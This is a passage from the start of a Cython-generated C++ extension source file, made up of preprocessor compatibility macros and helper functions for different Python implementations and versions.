 

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif  
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef __cplusplus
  #error "Cython files generated with the C++ option must be compiled with a C++ compiler."
#endif
#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #else
    #define CYTHON_INLINE inline
  #endif
#endif
template<typename T>
void __Pyx_call_destructor(T& x) {
    x.~T();
}
template<typename T>
class __Pyx_FakeReference {
  public:
    __Pyx_FakeReference() : ptr(NULL) { }
    __Pyx_FakeReference(const T& ref) : ptr(const_cast<T*>(&ref)) { }
    T *operator->() { return ptr; }
    T *operator&() { return ptr; }
    operator T&() { return *ptr; }
    template<typename U> bool operator ==(U other) { return *ptr == other; }
    template<typename U> bool operator !=(U other) { return *ptr != other; }
  private:
    T *ptr;
};

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too;  
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
